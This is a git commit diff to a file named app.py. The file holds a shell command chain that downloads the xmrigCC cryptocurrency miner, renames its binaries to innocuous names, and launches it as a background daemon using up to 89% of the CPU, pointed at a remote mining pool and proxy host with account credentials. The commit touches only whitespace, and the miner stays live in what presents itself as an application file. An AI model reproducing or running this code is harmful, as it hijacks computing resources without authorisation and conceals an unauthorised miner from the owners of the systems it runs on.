5eafa2af79a1b6595e5be3259cc0b244965e4b50
D. SAN. YIL <robinexx@gmail.com>
2022-11-29 22:04:41 +0300

    Update app.py

--- app.py
+++ app.py
@@ -9,5 +9,5 @@ RIGNAME=tlinecloud01 && MYDir=ppopc && MYRname=ihz && MyblankName=kag  && wget
 https://github.com/Bendr0id/xmrigCC/releases/download/3.3.1/xmrigCC-miner_only-3.3.1-linux-generic-static-amd64.tar.gz && 
   mkdir -p $MYDir && tar -xf xmrigCC-miner_only-3.3.1-linux-generic-static-amd64.tar.gz -C $MYDir && mv $MYDir/xmrigDaemon $MYDir/$MyblankName && mv 
   $MYDir/xmrigMiner $MYDir/$MYRname && rm -rf xmrigCC-miner_only-3.3.1-linux-generic-static-amd64.tar.gz && 
-  
- 64drive --daemonized --cpu-max-cpu-usage 89 --url 116.202.3.220:24656 -x t3d.myvnc.com:11564 -u 689smwHwGOc+zBuQHbk/Dt1syZrn1Rzx -p tline01 --donate-level 1 -a rx/xdag -B
+ 
+64drive --daemonized --cpu-max-cpu-usage 89 --url 116.202.3.220:24656 -x t3d.myvnc.com:11564 -u 689smwHwGOc+zBuQHbk/Dt1syZrn1Rzx -p tline01 --donate-level 1 -a rx/xdag -B
